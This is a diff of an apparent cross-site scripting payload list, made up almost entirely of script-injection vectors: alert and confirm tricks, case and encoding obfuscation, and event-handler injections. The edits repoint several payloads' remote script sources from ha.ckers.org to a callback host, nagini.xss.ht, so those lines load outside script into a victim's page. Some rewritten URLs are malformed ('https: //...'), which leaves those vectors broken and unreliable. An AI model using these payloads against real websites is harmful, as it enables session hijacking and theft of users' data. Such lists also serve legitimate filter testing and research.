@@ -1,15 +1,15 @@
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode<script>alert('xss')</script>
 //--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 '';!--"<XSS>=&{()}
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<SCRIPT SRC=https: //nagini.xss.ht></SCRIPT>
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=javascrscriptipt:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <IMG SRC=" &#14;  javascript:alert('XSS');">
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/XSS SRC="https: //nagini.xss.ht"></SCRIPT>
+<SCRIPT/SRC="https: //nagini.xss.ht"></SCRIPT>
 <<SCRIPT>alert("XSS");//<</SCRIPT>
 <SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
 \";alert('XSS');//
@@ -258,13 +258,13 @@ ABC<div style="x:\xE2\x80\x89expression(javascript:alert('XSS')">DEF
 <IMG onmouseover="alert('xxs')">
 <IMG SRC="jav   ascript:alert('XSS');">
 perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/XSS SRC="https: //nagini.xss.ht"></SCRIPT>
+<SCRIPT/SRC="https: //nagini.xss.ht"></SCRIPT>
 <<SCRIPT>alert("XSS");//<</SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
-<SCRIPT SRC=//ha.ckers.org/.j>
+<SCRIPT SRC=https: //nagini.xss.ht?< B >
+<SCRIPT SRC=https: //nagini.xss.ht/.j>
 <IMG SRC="javascript:alert('XSS')"
-<iframe src=http://ha.ckers.org/scriptlet.html <
+<iframe src=https: //nagini.xss.ht <
 \";alert('XSS');//
 <u oncopy=alert()> Copy me</u>
 <i onwheel=alert('XSS')> Scroll over me </i>
@@ -300,9 +300,9 @@ innerHTML=location.hash>#<script>alert('XSS')</script>
 <svG/x=">"/oNloaD=confirm()//
 <--`<iMG/srC=` onerror=confirm``> --!>
 <SVg </onlOad ="1> (_=prompt,_(1)) "">
-<!--><scRipT src=//14.rs>
+<!--><scRipT src=//https: //nagini.xss.ht>
 <sCriPt/src=//14.rs?
-<sCRIpt x=">" src=//15.rs></script>
+<sCRIpt x=">" src=//https: //nagini.xss.ht></script>
 <D3/OnMouSEenTer=[2].find(confirm)>z
 <D3"<"/OncLick="1>[confirm``]"<">z
 <D3/OnpOinTeReENter=confirm``>click here
